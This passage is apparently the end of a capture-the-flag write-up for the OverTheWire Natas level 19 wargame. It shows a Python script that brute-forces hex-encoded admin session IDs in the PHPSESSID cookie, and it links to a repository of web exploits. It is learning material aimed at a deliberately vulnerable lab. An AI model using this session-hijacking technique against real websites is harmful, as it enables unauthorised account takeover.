 HEADER ={'Cookie':'PHPSESSID=' + (str(i) + '-admin').encode('hex')}
 r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
 print(i)
 if "You are an admin" in r.text:
 print(r.text)
 print(r.url)

if __name__ == '__main__':

 AUTH = ('natas19', '***********************')
 URL = 'http://natas19.natas.labs.overthewire.org/index.php?'

 PAYLOAD = ({'debug': '1', 'username': 'admin', 'password': 'pass'})
 MAXID = 640

 brute_force_password(AUTH, URL, PAYLOAD, MAXID)
```

And we get our password in the 501st attempt. Awesome.



_____________________

That's it. The [source code is available] as usual.


Hack all the things!

[source code is available]: https://github.com/go-outside-labs/CTFs-Gray-Hacker-and-PenTesting/tree/master/Web_Exploits

